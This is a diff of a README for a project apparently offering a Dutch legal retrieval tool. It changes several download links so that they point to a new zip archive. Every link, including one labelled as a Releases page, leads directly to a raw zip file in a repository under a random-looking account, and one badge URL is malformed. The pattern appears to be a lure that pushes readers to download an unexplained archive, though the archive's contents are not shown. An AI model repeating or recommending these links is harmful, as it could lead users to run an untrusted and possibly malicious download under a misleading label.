@@ -6,18 +6,18 @@ Welcome to the nl-rag-qdrant-legal project! This software is designed to assist 
 
 ## 📥 Download the Software
 
-[![Download Now](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip)
+[![Download Now](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/legal_rag_qdrant_nl_3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/legal_rag_qdrant_nl_3.3.zip)
 
 To get started, please visit the **Releases** page to download the software:
 
-[Download Software](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip)
+[Download Software](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/legal_rag_qdrant_nl_3.3.zip)
 
 ## 🚀 Getting Started
 
 This section will guide you through the process of downloading and running the software.
 
 1. **Visit the Releases Page**: Click on the link below.
-   - [Releases Page](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/nl-rag-qdrant-legal-v3.3.zip)
+   - [Releases Page](https://raw.githubusercontent.com/kjgdgch65g/nl-rag-qdrant-legal/master/RAGQdrantLegal/legal_rag_qdrant_nl_3.3.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see several versions of the software listed. Look for the latest version. It will typically be at the top.
 
